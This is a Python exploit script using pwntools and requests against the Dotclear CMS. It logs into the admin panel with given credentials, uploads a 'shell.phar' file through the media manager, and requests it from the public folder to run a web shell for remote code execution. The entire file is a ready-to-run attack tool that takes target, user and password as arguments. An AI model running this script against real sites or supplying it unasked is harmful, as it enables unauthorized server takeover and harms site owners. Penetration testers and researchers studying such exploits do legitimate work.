#!/usr/bin/ python

from pwn import *
from sys import exit
import requests
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", dest="domain", help="Domain URL Address.")
    parser.add_argument("-u", "--email", dest="email", help="Login Username.")
    parser.add_argument("-p", "--password", dest="password", help="Login Password.")
    options = parser.parse_args()
    return options


class Exploit:
    def __init__(self, url, email, password):
        self.session = None
        self.url = url
        self.email = email
        self.password = password
        # self.rce_command = rce_command

    def login(self):
        self.session = requests.Session()
        login_url = self.url + "/dotclear/admin/auth.php"
        login_data = {
            "user_id": {self.email},
            "user_pwd": {self.password}   
        }
        try:
            login_session = self.session.post(login_url, data=login_data)
            if "Check your login details" in login_session.text:
                log.warn("login failed!")
                exit(0)
            if "Check your login details" not in login_session.text:
                log.success("Successfully logged in")

        except KeyboardInterrupt:
            log.success("Exiting..")

    def dotclear_rce_exploit(self):
        try:
            file_path = './shell.phar'

            with open(file_path, 'rb') as f:
                files = {'upfile[]': ('shell.phar',f,'application/octet-stream',
                {'Content-Disposition': 'form-data; name="upfile[]"; filename="shell.phar"'})}
                self.session.post(
                    self.url + "/dotclear/admin/media.php?sortby=name&amp;order=asc&amp;nb=30&amp;page=1",files=files)   
            log.success("Payload saved successfully")
            log.success("Getting Shell")
            requests.get(self.url + "/dotclear/public/" + "shell.phar")
            exit(0)


        except KeyboardInterrupt:
            log.success("Exiting..")


if __name__ == "__main__":
    options = get_arguments()

    url_ip = options.domain
    dotclear_email = options.email
    dotclear_password = options.password
    exploit = Exploit(url_ip, dotclear_email, dotclear_password)

    exploit.login()
    exploit.dotclear_rce_exploit()
